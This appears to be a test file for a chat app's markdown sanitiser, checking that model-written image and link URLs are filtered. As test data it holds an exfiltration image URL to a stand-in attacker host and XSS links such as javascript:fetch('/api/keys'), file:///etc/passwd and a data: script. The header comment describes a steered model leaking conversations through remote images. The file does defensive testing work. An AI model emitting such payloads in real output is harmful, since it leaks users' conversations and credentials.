/**
 * Origin/scheme policy for model-authored markdown.
 *
 * The chat renders text a language model wrote, and a model can be steered by
 * anything in its context. These tests pin the two attacks that matter.
 */

import test from "node:test";
import assert from "node:assert/strict";

const { isSafeLinkHref, isSafeImageSrc } = await import("../../src/lib/chat/markdown-safety.ts");

test("markdown safety: blocks the zero-click exfiltration image", () => {
  // The whole point. A remote <img> fires a GET on render, with no click, and
  // the query string can carry the entire conversation.
  assert.equal(
    isSafeImageSrc("https://attacker.tld/p?d=aGVsbG8gd29ybGQ"),
    false,
    "a remote image is an outbound request the user never consented to"
  );
  assert.equal(isSafeImageSrc("http://attacker.tld/x.png"), false);
  assert.equal(
    isSafeImageSrc("//attacker.tld/x.png"),
    false,
    "protocol-relative must not slip through"
  );
});

test("markdown safety: allows only images the app itself produced", () => {
  assert.equal(isSafeImageSrc("data:image/png;base64,iVBORw0KGgo="), true);
  assert.equal(isSafeImageSrc("blob:http://localhost/abc"), true);
  assert.equal(isSafeImageSrc("/api/attachments/deadbeef"), true);
});

test("markdown safety: blocks javascript: and other executable link schemes", () => {
  // Stored XSS on a same-origin page that holds cookies for every management API.
  assert.equal(isSafeLinkHref("javascript:fetch('/api/keys')"), false);
  assert.equal(
    isSafeLinkHref("JavaScript:alert(1)"),
    false,
    "scheme match must be case-insensitive"
  );
  assert.equal(
    isSafeLinkHref("  javascript:alert(1)  "),
    false,
    "leading whitespace must not bypass"
  );
  assert.equal(isSafeLinkHref("vbscript:msgbox"), false);
  assert.equal(isSafeLinkHref("file:///etc/passwd"), false);
  assert.equal(isSafeLinkHref("data:text/html,<script>alert(1)</script>"), false);
});

test("markdown safety: allows ordinary links", () => {
  assert.equal(isSafeLinkHref("https://example.com"), true);
  assert.equal(isSafeLinkHref("http://example.com"), true);
  assert.equal(isSafeLinkHref("mailto:a@b.c"), true);
  assert.equal(isSafeLinkHref("/dashboard/chat"), true);
  assert.equal(isSafeLinkHref("#section"), true);
});

test("markdown safety: empty and malformed inputs are rejected, not thrown on", () => {
  for (const value of [undefined, null, "", "   ", "http://[bad"]) {
    assert.equal(isSafeLinkHref(value), false);
    assert.equal(isSafeImageSrc(value), false);
  }
});
